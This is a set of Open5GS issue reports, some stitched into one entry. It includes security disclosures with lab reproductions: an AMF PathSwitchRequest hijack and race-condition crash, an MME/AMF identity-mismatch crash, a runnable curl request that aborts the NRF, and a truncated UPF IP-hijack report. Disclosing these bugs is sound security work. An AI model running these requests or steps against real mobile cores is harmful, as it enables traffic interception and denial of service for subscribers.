items.title: UDM: SDM subscriptions are never released for UEs that vanish without deregistering, so the 4096 pool fills and registrations fail as "5GS services not allowed" with no AMF-side error

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Version

Open5GS **2.7.5** (container `gradiant/open5gs:2.7.5`), Kubernetes, single node. AMF/SMF/UDM/UDR/AUSF/NRF/SCP/PCF/BSF all 2.7.5.

### Summary

The UDM's SDM subscription pool is bounded at 4096 and entries are not reclaimed when a UE disappears without a clean deregistration. Because roughly 8 subscriptions are consumed per registered UE, this caps concurrent UEs at about 500 — and, critically, the consumed entries **persist across test runs**, so the effective ceiling drops every time a batch of UEs is killed rather than deregistered.

The failure is hard to diagnose because **the AMF logs nothing**. The UE sees `5GS services not allowed`, which reads like a subscription/provisioning problem, and only the UDM log reveals the real cause.

### What I observed

Registering UEs in batches with a load generator (PacketRusher) against a freshly started core:

- 1, 10, 25, 50, 100, 200 UEs: all register cleanly.
- 500 UEs: **only 375 registered**, the rest rejected.
- UDM log: `Maximum number of SDM Subscriptions [4096] reached (../src/udm/context.c:381)` repeated, plus `udm_sdm_subscription_add() failed (../src/udm/nudm-handler.c:708)` per affected SUPI.
- AMF log for the same period: **no errors or warnings at all**.
- UE-visible cause: `5GMM cause: 5GS services not allowed`.

Restarting only the UDM (nothing else) and immediately repeating the same 500-UE run gives **500/500 registered**. That is what identifies it as accumulation rather than a capacity limit: the 375 figure was leftovers from earlier runs, not a property of the current one.

### Why entries accumulate

The load generator is stopped by killing the process, so the UEs never send a Deregistration Request. Any real-world equivalent — a crashed RAN simulator, a node losing power, a container being killed — would leave the same residue. After enough such events the pool is exhausted and the core refuses new registrations until the UDM is restarted, with no indication at the AMF that the UDM is the cause.

### Reproduction

1. Start a clean Open5GS 2.7.5 core and provision N subscribers.
2. Register ~400 UEs, then kill the RAN simulator without deregistering.
3. Repeat. Each cycle consumes pool entries permanently.
4. Watch `Maximum number of SDM Subscriptions [4096] reached` appear in the UDM log while the AMF stays silent, and registrations start failing with `5GS services not allowed`.

### Workaround

Setting `global.max.ue` above the default in the **UDM** configuration removes the ceiling for a given run:

```yaml
global:
  max:
    ue: 8192
```

After this the `Maximum number of SDM Subscriptions` errors stop entirely. It does not address the underlying non-reclamation — a UDM restart is still needed between runs — but it raises the bar.

### Suggestions

Two things would each have saved a lot of diagnosis time here, independently of whether the reclamation behaviour is considered a bug:

1. **Surface the cause upstream.** When the UDM returns a failure for `udm_sdm_subscription_add()`, the AMF currently logs nothing and the UE receives a generic `5GS services not allowed`. Logging the UDM-side reason at the AMF, or mapping it to a more specific 5GMM cause, would point at the real problem.
2. **Reclaim or age out SDM subscriptions** whose UE context no longer exists — for example on AMF context release, or via a TTL — so that an unclean RAN teardown does not permanently consume pool entries.

Happy to provide fuller logs or retest against a patch.

### Open5GS Release, Revision, or Tag

v2.8.0 (master)

### Steps to reproduce

TTCN-3 test SMF_Tests.TC_pfcp_heartbeat_timeout from osmo-ttcn3-hacks.git showcases the scenario:
https://gerrit.osmocom.org/c/osmo-ttcn3-hacks/+/43873

### Logs

```shell
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Response Timeout for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:623)
10/12 11:54:40.821: [pfcp] WARNING: [2] LOCAL  No Reponse. Give up! for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:642)
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Delete  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:836)
10/12 11:54:40.821: [smf] DEBUG: smf_state_operational(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/smf-sm.c:94)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] WARNING: No Heartbeat from UPF [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:426)
10/12 11:54:40.821: [smf] ERROR: No UPF available (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:528)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): EXIT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] INFO: PFCP de-associated [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:205)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_will_associate(): ENTRY (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:74)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Create  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:131)
10/12 11:54:40.821: [pfcp] DEBUG: Association Setup Request (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/build.c:87)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  UPD TX-5  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:231)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Commit  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:500)
```

### Expected behaviour

As of current main  (d5d735c67356ff4cb2d86be6effadcc351b5b7b5), open5gs-smfd doesn't release UE sessions after the only UPF available is considered to be unavailable after obtaining no answer for a while (eg. multiple Heartbeat Requests not answered).

With current implementation, open5gs-smfd will keep trying forever until the UPF is available again and it sends a newer (bigger) Recovery timestamp which starts restoration value. 

The problem with that is that it may take a long time, or even "forever", for the UPF to become available again, and during that potentially long time the Control Plane assumes the user plane is working just fine, because the sessions are still active, which is false. This means for instance time accounting may go on on the OCS, etc.

Instead, when a Heartbeat timeout happens (configurable by the user, eg. 60 seconds) and the UPF is considered unavailable, it should release all the sessions on the core network so that the subscriber can see it has no PDU session instead of simply seeing no traffic passing through.

What do the specs say about this scenario? Well, they basically say it's "implementation specific".

3GPP TS 29.244 5.8.2 Behaviour with an Established PFCP Association
> When a PFCP Association is established with a UP function, the CP function:
> ...
> - shall check the responsiveness of the UP function using the Heartbeat procedure as specified in clause 6.2.2;

3GPP TS 23.527 4.2 N4 Failure and Restart Detection:
> Across PFCP based interfaces, an SMF and UPF shall utilize the PFCP Heartbeat Request and Heartbeat Response
> messages to detect a peer PFCP entity failure or restart as described in clause 19A of 3GPP TS 23.007

3GPP TS 23.527 4.5 N4 path failure:
> If the N4 path to the UPF is down, the SMF should handle this as an UPF Failure without Restart, see clause 4.3.3.

4.3.3 Restoration Procedure for PSA UPF Failure without Restart
> Procedures for PSA UPF failure without restart are implementation specific.

### Observed Behaviour

See "Expected behaviour" section.

### eNodeB/gNodeB

TTCN-3

### UE Models and versions

_No response_

items.title: [Security Bug]: AMF accepts NGAP PathSwitchRequest without ownership check + Crashes due to race condition

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). 
Still unfixed on current main (source-checked 2026-09-04 @ `941e4cc2d`).

### Security impact

Any associated peer can re-home a live UE's NGAP context and redirect
its downlink FAR to an attacker-chosen endpoint due to a lack of ownership in the
referenced UE context. The redirection of the victim's downlink stream to 
an attacker-controlled endpoint is the confidentiality/integrity impact, and the controlled 
outage is the availability impact.

**Update: The same primitive can also be used to trigger AMF process abort with no SMF 
precondition due to race condition**

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **AMF** — NGAP PathSwitchRequest handling
(`src/amf/ngap-handler.c`, `ngap_handle_path_switch_request()`) and the
UE-context/`ran_ue` management it drives.

### Summary

`ngap_handle_path_switch_request()` resolves the target UE with a global
lookup by the AMF_UE_NGAP_ID carried in the message
(`ran_ue_find_by_amf_ue_ngap_id()`, `src/amf/ngap-handler.c:3074`) and
never verifies that the sending NGAP association is the one that
currently owns (serves) that UE context. Any associated gNB, including
a rogue gNB smuggled out of a UE data plane, can re-home a
live peer UE's NGAP context to itself by knowing or enumerating the
peer's AMF_UE_NGAP_ID. After acceptance, the AMF runs its normal 
path-switch chain: the context move is logged
([OLD]/[NEW] RAN_UE_NGAP_ID), the handler's PDU-session loop sends an
N11 SM-context update, and the SMF/UPF rewrite the victim's downlink
FAR toward the attacker's endpoint (UPF `gtp_connect() [10.45.0.9]:2152`). 
The victim's downlink was measurably cut and recovered only
when the victim re-registered (a full re-registration on a new address).

This bug can also be used to trigger a race condition assert.
1. The PathSwitchRequest handler switches the victim's context to the
   sender's gNB with no ownership check
   (`ran_ue->gnb_id = gnb->id`).
2. When that association goes down, `amf_gnb_remove()` frees the
   `amf_gnb_t` while the per-UE deactivation chain (N11/PFCP for the
   victim's live PDU sessions) is still in flight. The `ran_ue` is not
   reaped (the sweep skips it because the deactivation created new SBI
   transactions) but keeps pointing at the freed gNB.
3. A PathSwitchRequest re-claim for the victim's AMF_UE_NGAP_ID
   arriving inside that window (delta ≈ 0–1 ms observed) resolves the
   still-alive context, then `ran_ue_switch_to_gnb()` resolves the
   dangling `gnb_id` → `amf_gnb_find_by_id()` returns NULL →
   `ogs_assert(gnb)` aborts `open5gs-amfd`
   (`src/amf/context.c:1451`). amfd is left `<defunct>`; every NGAP
   service is lost until the open5gs containers restart.

These issues are still present on current main (`1f70b24c`).
The RAN-node-ownership enforcement commit `9a22baa76`
("Enforce RAN node ownership in handover handlers") adds
`source_ue->gnb_id != gnb->id` checks to the NGAP/S1AP handover handlers
but its own commit message explicitly excludes PathSwitchRequest.

### Steps to reproduce
#### Issue A: PathSwitchRequest from any peer.
Lab: Two attached UEs.
* Attacker UE `10.45.0.9`
* Benign peer UE `10.45.0.8`
* Core container `192.168.233.132` hosting both AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).

1. Attach both UEs.
2. From the attacker UE, open an SCTP association to
   `192.168.233.132:38412` with inner IP packets sent as ordinary uplink
   IP packets through the attacker's established PDU session (the UPF
   decapsulates and the kernel delivers them to the AMF, as in the PFCP
   smuggling path). AMF log: `gNB-N2 accepted[10.45.0.9]:33250 in
   ng-path module`.
3. Complete NG Setup with a gNB ID distinct from the real gNB (fake gNB
   ID 2) and the lab PLMN/TAC (001/01, TAC 1) — NGSetupResponse,
   successfulOutcome (proc 21), 54 bytes.
4. Probe PathSwitchRequest candidates (attacker-chosen RAN_UE_NGAP_ID
   5000, UserLocationInformation with the lab TAC): ErrorIndication-sweep
   the 60 unknown AMF_UE_NGAP_IDs (3–7, 10–64, PDU Session ID 1), then
   send three probes each (PDU Session IDs 1, 2, 3) to the two live IDs
   — the peer's (8) and the attacker's own (9). Record per-candidate
   responses.
5. The peer's live ID 8 with session 1 is accepted: verify the
   `[OLD]`/`[NEW]` context move in the AMF log, the UPF Session
   Modification with `gtp_connect() [10.45.0.9]:2152` two milliseconds
   later, and re-measure the peer's downlink. The attacker's own ID 9 is
   likewise accepted (context re-homed, UPF session modified) but its
   probes draw no decodable response.

#### Issue B: Crash AMF
Lab: Two attached UEs.
* Attacker UE (PDU-session address `10.45.0.2`
* Benign peer UE `imsi-001010123456790` with a live PDU session.
* Core container `192.168.233.132` hosting AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).
Script: `r8b_race.py` (attached zip; staged in the attacker UE container with
the `ueprobe` package and `pycrate`); the associations are smuggled as
ordinary uplink IP packets through the attacker's PDU session.

1. Attach both UEs (the peer's live session is what keeps its `ran_ue`
   alive through the removal).
2. From the attacker UE open association B (NG Setup, gNB ID 3), then
   association A (NG Setup, gNB ID 2). Both get NGSetupResponse
   (successfulOutcome, proc 21).
3. Re-home the peer's context onto A: PathSwitchRequest from A
   (attacker-chosen `RAN_UE_NGAP_ID` 5000, the peer's live
   `AMF_UE_NGAP_ID`, UserLocationInformation with the lab TAC) →
   PathSwitchRequestAcknowledge (proc 25).
4. SHUTDOWN A and, delta = 0, send the re-claim PathSwitchRequest for
   the peer's ID from B (single burst pre-associated, no handshake
   inside the window). The script sweeps delta 0–40 ms in 0.4 ms steps
   for robustness.
5. Detect: no response to the re-claim and a fresh NG Setup that gets
   no answer, meaning that amfd is gone. The script's liveness check is a full NG
   Setup exchange (a raw-SCTP connect alone cannot see a dead peer).

### Logs (Attached)
#### Issue A: PathSwitchRequest from any peer.
[R8-amf-pathswitch-context-hijack.zip](https://github.com/user-attachments/files/31734861/R8-amf-pathswitch-context-hijack.zip)

```shell
[amf] INFO: gNB-N2 accepted[10.45.0.9]:33250 in ng-path module
[amf] INFO: PathSwitchRequest
[amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[3]    (x60: ids 3..7 and 10..64, cause radioNetwork=14)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[8] AMF_UE_NGAP_ID[8]     (14:33:27.685 — peer's live ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[8]
[upf] DEBUG: Session Modification Request                     (14:33:27.687)
[gtp] INFO: gtp_connect() [10.45.0.9]:2152                    (14:33:27.687)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[9] AMF_UE_NGAP_ID[9]     (14:33:27.851 — attacker's own ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[9]
[upf] DEBUG: Session Modification Request                     (14:33:27.852)
```

(all lines from `q023_amf.log` and `q023_upf.log`. `q023_smf.log`'s
capture starts at 14:33:28.167, so the N11 SM-context update has no
SMF-side line; the only `POST /nsmf-pdusession/v1/sm-contexts/7/modify`
in it is at 14:34:05.777 — the association-release-phase modify for the
victim's session, after which the downlink stayed cut.)

(Each accepted path switch also logs `UE Security Capability mismatch in PathSwitchRequest`.
Per TS 33.501 6.7.3.1 comment in the handler, the AMF answers a mismatched
PathSwitchRequest with its locally stored UE security capabilities in
the PathSwitchRequestAcknowledge (`ngap-handler.c:3310-3314`).)

58 diverted GTP-U datagrams were captured on
the attacker's UDP 2152 listener (`q023_sink.jsonl`), all on the
attacker's own-session TEID 0xa5000091, none on the peer-session TEID
0xa5000081 (attacker-chosen and installed by the AMF in the victim's
downlink FAR).

#### Issue B: Crash AMF

[R8b-amf-pathswitch-context-hijack-crash.zip](https://github.com/user-attachments/files/31863769/R8b-amf-pathswitch-context-hijack-crash.zip)

Run 4 of 4 (11:09:06), verbatim from `amf.log`
(`amf-crash-r8b3-w4.log` in the zip; runs 1–3 in `amf-crash-r8b3-w1/2/3.log`):

    09/05 11:09:05.944: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:05.944: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[4] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [OLD] TAC[1] CellID[0x10] (ngap-handler.c:3104)
    09/05 11:09:05.944: [amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [NEW] TAC[1] CellID[0x10] (ngap-handler.c:3306)
    09/05 11:09:06.495: [amf] INFO: gNB-N2[10.45.0.2] connection refused!!! (amf-sm.c:882)
    09/05 11:09:06.495: [amf] INFO: [Removed] Number of gNBs is now 2 (context.c:1305)
    09/05 11:09:06.495: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:06.495: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:06.496: [amf] INFO:     [OLD] TAC[1] CellID[0x10]
    09/05 11:09:06.496: [amf] FATAL: ran_ue_switch_to_gnb: Assertion `gnb' failed. (../open5gs-src/src/amf/context.c:1451)
    09/05 11:09:06.496: [core] FATAL: backtrace() returned 11 addresses (../open5gs-src/lib/core/ogs-abort.c:37)

Four consecutive runs, identical fingerprint, delta = 0 each time:

| run | re-home | `[Removed]` | re-claim → FATAL (`context.c:1451`) |
|-----|-----------------|--------------------|--------------------------------------|
| 1   | 10:55:58.825    | 10:55:59.376       | 10:55:59.377                         |
| 2   | 11:01:26.841    | 11:01:27.391       | 11:01:27.392                         |
| 3   | 11:06:44.628    | 11:06:45.179       | 11:06:45.180                         |
| 4   | 11:09:05.944    | 11:09:06.495       | 11:09:06.496                         |

After each abort `open5gs-amfd` is `<defunct>` (zombie; no child reaper
restarts it) meaning that we get no NGAP service until the open5gs containers restart.

### Expected behaviour

The AMF must verify that the NGAP association sending a
PathSwitchRequest is the association that currently owns (serves) the
referenced UE context, and reject otherwise (cause: unexpected NGAP peer
/ unknown local UE NGAP-ID) without leaking which AMF_UE_NGAP_IDs are
live. Additionally, the AMF must never resolve a UE context to a freed gNB. The association
close and the UE-context cleanup must be ordered so no `ran_ue` can
outlive the gNB it points at. A re-claim for a context the sender does not own
should additionally fail the ownership check before any switch.
**Upstream itself applied exactly this class of ownership check to
the neighbouring handlers in `9a22baa76`.**

### Observed Behaviour
#### Issue A: PathSwitchRequest from any peer.
```c
/* src/amf/ngap-handler.c @ ee596937d — ngap_handle_path_switch_request() */
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);        /* :3074 — global lookup */
if (!ran_ue) {
    ogs_error("No RAN UE Context : AMF_UE_NGAP_ID[%lld]",
            (long long)amf_ue_ngap_id);
    r = ngap_send_error_indication(
            gnb, (uint64_t *)RAN_UE_NGAP_ID, &amf_ue_ngap_id,
            NGAP_Cause_PR_radioNetwork,
            NGAP_CauseRadioNetwork_unknown_local_UE_NGAP_ID);
    return;
}
amf_ue = amf_ue_find_by_id(ran_ue->amf_ue_id);
…
/* Change ran_ue to the NEW gNB after mandatory IE validation */   /* :3288 */
ran_ue_switch_to_gnb(ran_ue, gnb);                                  /* :3289 */
ogs_info("    [NEW] RAN_UE_NGAP_ID[%lld] AMF_UE_NGAP_ID[%lld] ",    /* :3291 */
    (long long)ran_ue->ran_ue_ngap_id, (long long)ran_ue->amf_ue_ngap_id);
```

The lookup is global across all gNB associations: `gnb` (the sending
association) is never compared with the context's serving gNB. The
ErrorIndication branch at `:3074-3085` is the enumeration oracle — it
distinguishes "no such UE" from "accepted" on the same ID space. After
acceptance the handler logs the `[OLD]`/`[NEW]` move and proceeds into
the N11/N4 modification chain.

#### Issue B: Crash AMF
`ogs_assert(gnb)` fails in `ran_ue_switch_to_gnb()` (`context.c:1451`)
and amfd aborts as `<defunct>` zombie and we get no NGAP service until the
containers restart.

UERANSIM

UERANSIM

items.title: [Bug]: MME/AMF crash on Attach/Registration with mismatched identity

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

The problem can be reproduced with two subscribers.

MME:

1. Attach UE-2, establish its default bearer, and release its S1 context so that UE-2 becomes idle while its MME-UE context and session remain.
2. Attach UE-1 and keep its S1 connection and default bearer active.
3. Build an ATTACH REQUEST containing the IMSI of UE-2.
4. Send that request using UplinkNASTransport with the S1AP IDs of UE-1.
5. The MME dispatches the request to UE-1's MME-UE context without first checking the EPS mobile identity in the request.
6. mme_ue_set_imsi() attempts to relabel UE-1's context and migrate UE-2's session into it.

The MME aborts because both contexts already own EBI 5 and UE-1's session list is not empty.

A second variant can be reproduced by provisioning UE-2 in the database without attaching it first. In that case mme_ue_find_by_message() returns NULL. The MME does not abort, but silently relabels UE-1's context as UE-2. Detaching UE-2 then removes UE-1's context and UE-1 can no longer resume its session.

AMF:

1. Register UE-2, establish a PDU session, and release its NG context.
2. Register UE-1, establish a PDU session, and keep it connected.
3. Build a REGISTRATION REQUEST containing the SUCI of UE-2.
4. Send it using UplinkNASTransport with the NGAP IDs of UE-1.
5. The AMF dispatches the request to UE-1's AMF-UE context without checking the 5GS mobile identity.
6. amf_ue_set_suci() calls amf_ue_release_old_context(), which attempts to migrate UE-2's sessions into UE-1's non-empty session list.

The scenarios were reproduced using the Open5GS test framework with the default test configuration.

### Logs

```shell
08/09 20:47:38.224: [mme] ERROR: [UE-IDENTITY-TRACK] IMSI-REBIND current_ue_id[2] current_imsi[999700000000003] requested_imsi[999700000000013] current_sessions[1] current_bitmap[0x0020] requested_ue_id[1] requested_sessions[1] requested_bitmap[0x0020] S_TMSI[G:2,C:1,M_TMSI:0xc0000331] enb_ue_id[2] ENB_UE_S1AP_ID[1] MME_UE_S1AP_ID[2]

08/09 20:47:38.224: [mme] ERROR: [EBI-TRACK] RESERVE-COLLISION EBI[5] already reserved ue_id[2] IMSI[999700000000013] bitmap[0x0020]

[AMF equivalent]

amf_ue_release_old_context: Assertion `ogs_list_empty(&amf_ue->sess_list)' failed.
```

### Expected behaviour

Before dispatching an ATTACH REQUEST or REGISTRATION REQUEST through an existing S1/NG association, the MME/AMF should verify that the mobile identity in the NAS request belongs to the associated UE context.

If the identities differ and the associated context is registered or already owns sessions, the existing subscriber's sessions must not be relabelled or migrated to the requested identity.

The access connection should be released and the mismatched request dropped so that the UE can retry on a newly resolved S1/NG context. The original subscriber context and its session ownership should remain intact.

### Observed Behaviour

The MME/AMF trusts the UE context already associated with the S1/NG connection and does not re-resolve the mobile identity carried by the Attach/Registration Request.

When the requested identity already has another UE context with sessions, session migration into the associated context violates the empty-session-list invariant and aborts the MME/AMF.

When the requested identity has no existing UE context, no assertion occurs. Instead, the associated context and its sessions are silently relabelled as the new subscriber, corrupting subscriber and session ownership.

labels.name: Housekeeping:ToClose

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce


NRF crashes when processing an NF registration (`PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`) containing an `smfInfo` with more than 16 DNN entries in a single SNSSAI slice.

The root cause is a reachable assertion (CWE-617) in the inner DNN iteration loop of `handle_smf_info()`:

```c
OpenAPI_list_for_each(DnnSmfInfoList, node2) {
    DnnSmfInfoItem = node2->data;
    if (DnnSmfInfoItem && DnnSmfInfoItem->dnn) {
        int dnn_index = nf_info->smf.slice
            [nf_info->smf.num_of_slice].num_of_dnn;

        ogs_assert(dnn_index < OGS_MAX_NUM_OF_DNN);   // <-- CRASH
        nf_info->smf.slice[nf_info->smf.num_of_slice].
            dnn[dnn_index] = ogs_strdup(DnnSmfInfoItem->dnn);
        ogs_assert(
            nf_info->smf.slice[nf_info->smf.num_of_slice].
                dnn[dnn_index]);
        nf_info->smf.slice[nf_info->smf.num_of_slice].
            num_of_dnn++;
    }
}
```

at `../lib/sbi/nnrf-handler.c:428-442`.

The destination array has capacity `OGS_MAX_NUM_OF_DNN == 16`:

```c
#define OGS_MAX_NUM_OF_DNN              16
```

at `../lib/proto/types.h:102`.

The **outer** slice loop was already bounded by the fix for #4249:

```c
if (nf_info->smf.num_of_slice >= OGS_MAX_NUM_OF_SLICE) {
    ogs_error("OVERFLOW Slice [%d:%d]", ...);
    break;
}
```

at `../lib/sbi/nnrf-handler.c:421-424`.

However the **inner** DNN loop was not addressed - the `ogs_assert` at `line 434` remained unchanged since commit `e6a14cb73d` (2022-08-12). Sending 17 or more DNN entries in a single SNSSAI triggers the assertion, which calls `ogs_abort()` → `abort()` → `SIGABRT`, terminating the NRF process.

Without the assertion, the code would write `ogs_strdup()` pointers past the end of the `dnn[16]` array into adjacent heap memory (CWE-787), corrupting the `ogs_sbi_nf_info_t` struct.

This is distinct from #4249 (outer slice loop, fixed), #4463 (NF-info pool exhaustion via `smfInfoList` map entries, different root cause), and #4467 (AMF `taiRangeList.tacRangeList`, different handler and array).

### Root cause

- Entry route: `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
- Call chain: `nrf_nnrf_handle_nf_register()` → `ogs_nnrf_nfm_handle_nf_profile()` → `handle_smf_info()`
- Root-cause site: `../lib/sbi/nnrf-handler.c:434`
- Root cause family: CWE-617 (Reachable Assertion) / CWE-129 (Improper Validation of Array Index)
- Controlling field: `NFProfile.smfInfo.sNssaiSmfInfoList[*].dnnSmfInfoList`

### Steps to Reproduce

Prerequisite: Open5GS v2.7.7 with NRF running on default configuration (`127.0.0.10:7777`). Python 3 with `httpx` and `h2` packages (`pip3 install httpx[http2] h2`).

1. Confirm NRF is running:

```bash
curl --http2-prior-knowledge http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances
```

2. Note the NRF PID:

```bash
echo "NRF PID: $(pgrep -f open5gs-nrfd)"
```

3. Send malicious NF registration with 20 DNN entries (limit is 16):

```bash
curl --http2-prior-knowledge -X PUT \
  http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee \
  -H 'Content-Type: application/json' \
  --data-raw "$(python3 -c '
import json
dnn_list = [{"dnn": f"overflow-dnn-{i}"} for i in range(20)]
data = {
    "nfInstanceId": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
    "nfType": "SMF",
    "nfStatus": "REGISTERED",
    "smfInfo": {
        "sNssaiSmfInfoList": [{
            "sNssai": {"sst": 1},
            "dnnSmfInfoList": dnn_list
        }]
    }
}
print(json.dumps(data))
')"
```


4, Verify that PID has changed:
```bash
echo "NRF PID: $(pgrep -f open5gs-nrfd)"
```

5. Verify NRF crashed via service log:
```bash
journalctl -u open5gs-nrfd --since "1 minute ago" | grep -E "FATAL|ABRT|assert"
```

### Logs

```shell
04/22 08:57:22.490: [sbi] FATAL: handle_smf_info: Assertion `dnn_index < OGS_MAX_NUM_OF_DNN' failed. (../lib/sbi/nnrf-handler.c:434)
04/22 08:57:22.492: [core] FATAL: backtrace() returned 12 addresses (../lib/core/ogs-abort.c:37)
/usr/lib/aarch64-linux-gnu/libogssbi.so.2(+0x3f6d8) [0xef15385ff6d8]
/usr/lib/aarch64-linux-gnu/libogssbi.so.2(ogs_nnrf_nfm_handle_nf_profile+0x434) [0xef1538600274]
/usr/bin/open5gs-nrfd(+0x6560) [0xc655655f6560]
/usr/bin/open5gs-nrfd(+0x6b94) [0xc655655f6b94]
/usr/lib/aarch64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x2c) [0xef153855964c]
/usr/bin/open5gs-nrfd(+0x9014) [0xc655655f9014]
/usr/lib/aarch64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x2c) [0xef153855964c]
/usr/bin/open5gs-nrfd(+0x5d1c) [0xc655655f5d1c]
/usr/lib/aarch64-linux-gnu/libogscore.so.2(+0x978c) [0xef153854978c]
/usr/lib/aarch64-linux-gnu/libc.so.6(+0x8b9f4) [0xef1537dcb9f4]
/usr/lib/aarch64-linux-gnu/libc.so.6(+0xf700c) [0xef1537e3700c]
systemd[1]: open5gs-nrfd.service: Main process exited, code=dumped, status=6/ABRT
systemd[1]: open5gs-nrfd.service: Failed with result 'core-dump'.
```

### Expected behaviour

NRF should cap the number of DNN entries at `OGS_MAX_NUM_OF_DNN` and continue processing, consistent with the bounded pattern already used for the outer slice loop at `line 421`.

### Observed Behaviour

A single unauthenticated HTTP/2 request terminates the NRF process with `SIGABRT` (exit code 6, core dump). `systemd` restarts the NRF, but the request can be repeated for persistent DoS. All dependent NFs (AMF, SMF, UPF, etc.) lose NF discovery while the NRF is down.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

### Suggested fix

Replace the assertion with a bounds check and break:

```diff
--- a/lib/sbi/nnrf-handler.c
+++ b/lib/sbi/nnrf-handler.c
@@ -431,12 +431,20 @@
                     int dnn_index = nf_info->smf.slice
                         [nf_info->smf.num_of_slice].num_of_dnn;

-                    ogs_assert(dnn_index < OGS_MAX_NUM_OF_DNN);
+                    if (dnn_index >= OGS_MAX_NUM_OF_DNN) {
+                        ogs_warn("Exceeded maximum DNN entries (%d) "
+                                "in SNSSAI [%d]",
+                                OGS_MAX_NUM_OF_DNN,
+                                nf_info->smf.num_of_slice);
+                        break;
+                    }
                     nf_info->smf.slice[nf_info->smf.num_of_slice].
                         dnn[dnn_index] = ogs_strdup(DnnSmfInfoItem->dnn);
-                    ogs_assert(
-                        nf_info->smf.slice[nf_info->smf.num_of_slice].
-                            dnn[dnn_index]);
+                    if (!nf_info->smf.slice[nf_info->smf.num_of_slice].
+                            dnn[dnn_index]) {
+                        ogs_error("ogs_strdup() failed for DNN");
+                        break;
+                    }
                     nf_info->smf.slice[nf_info->smf.num_of_slice].
                         num_of_dnn++;
```

This fix was tested locally: the patched NRF logs a warning and returns HTTP 400 instead of crashing.

items.title: [Security Bug]: UPF does not enforce UE-IP uniqueness across sessions.

labels.description: Security issue

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76)

### Security impact

Any associated peer (in practice: any registered UE, via the data-plane
delivery path) can claim any other UE's IP with one rogue Session
Establishment: the victim's entire downlink (all applications, all flows) is
silently re-routed to the attacker — full confidentiality/integrity/
availability break for the victim UE, no malformed input, no crash.

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **UPF** only — its session/PDR handling. `upf_sess_set_ue_ip()`
(`src/upf/context.c:396`) installs a session's UE IP into `self.ipv4_hash`
with no check that another live session already owns the address, and
`ogs_pfcp_ue_ip_alloc()` (`lib/pfcp/context.c:2339`) grants an
attacker-chosen static IP that is already in use without consulting the
